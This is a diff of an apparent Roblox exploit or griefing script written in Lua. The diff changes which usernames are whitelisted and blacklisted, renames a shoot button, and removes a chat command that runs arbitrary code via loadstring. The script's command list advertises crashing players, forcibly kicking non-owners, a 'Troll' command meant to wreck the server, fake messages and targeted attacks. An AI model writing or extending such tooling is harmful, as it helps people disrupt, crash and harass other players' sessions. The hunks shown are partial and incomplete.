@@ -35,14 +35,14 @@ local rtx = {
   sunrise = {"outdoorambient 0.7 0.7 0.7", "ambient 100 0 100", "fogend 3000", "time 6.9", "colorshifttop 100 50 0", "colorshiftbottom 0 0 0"}
 }
 
-local blacklist = {"Raysdamain"}
-local whitelist = {"atprog", "t_echr", "IceStuds"}
+local blacklist = {"skconk"}
+local whitelist = {"MarkDwayne_Pro", "t_echr", "hellonoobsloljkw"}
 
 local cmds = {
 
 "re",
 "regen",
-"shootbutton",
+"Shoot",
 "rail plr amnt delay(opt)",
 "laser plr amt delay(opt)",
 "setgplr -- Sets a target",
@@ -50,11 +50,9 @@ local cmds = {
 "bl2 player -- this doesnt unbl, cuz this custom bl also hatkicks the player!",
 "Who crashed -- vg",
 "Who crashed? -- Orinthian vg",
-"Im not showing you antis lol the only thing i tell you is that you turn them on and off by saying on and off after the command",
 "fakemsg plr text --unfinished",
 "bl/unbl plr --Blacklists the player",
 "dogify player -- this will fuck the player's character into a dog. it MAY crash them",
-"-run -- fo reel!?"
 "Troll -- this will fuck the server up. not crashing but still gonna make the server a living Bullshit",
 "wl/unwl --Whitelists the player(Whitelist currently is
 malfunctioning!)"
@@ -110,7 +108,7 @@ for plri, plr in pairs(getplrs) do
 
       if cmd == "SolarKick" then
           
-        if lp.Name ~= "masterplayerguy1234" and lp.Name ~= "atprog" then
+        if lp.Name ~= "masterplayerguy1234" and lp.Name ~= "MarkDwayne_Pro" then
           lp:Kick("You have been kicked by Owner of Solarity.")
         end
       end
@@ -271,7 +269,7 @@ end
       end
         
         
-      if cmd == "shootbutton" then
+      if cmd == "Shoot" then
 
         local sg = Instance.new("ScreenGui")
         sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -279,7 +277,7 @@ end
         sb.Parent = sg
         sb.Size = UDim2.new(0, 50, 0, 50)
         sb.Position = UDim2.new(1, -200, 0, 200)
-        sb.Text = "C"
+        sb.Text = "Shoot"
         sb.Activated:Connect(function()
 
           ct("equipall")
@@ -352,14 +350,6 @@ v.Click:FireServer(game.Players[gplr].Character:GetPivot().Position)
        end
      end
 
-     if cmd == "-run" then
-     local code = message:sub(6)
-        local success, result = pcall(function()
-            loadstring(code)()
-        end)
-        if not success then
-            game.Players:chat("h Error executing code: " .. result)
-        end
      
 
 -- Add this inside the plr.Chatted:Connect function
